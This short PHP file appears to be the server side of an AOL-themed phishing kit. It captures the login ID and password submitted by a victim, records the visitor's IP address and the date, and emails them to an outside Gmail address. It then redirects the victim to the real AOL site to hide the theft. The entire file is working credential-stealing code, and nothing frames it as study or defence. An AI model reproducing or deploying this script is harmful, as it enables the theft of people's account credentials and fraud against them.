<?php

session_start();
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$message .= "--------      UserID      ------------------------------\n";
$message .= "Username: ".$_POST['loginId']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "======================================\n";
$message .= "IP: ".$ip."\n";
$message .= "Date: ".$adddate."\n";
$message .= "--------------------------------------\n";

$recipient = "kellyjamesart7@gmail.com";
$subject = "AOL-OBO- Created By RANDY.KOAB- INSHA ALLAH ";
$headers = "From: ";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: https://www.aol.com");

	   }


?>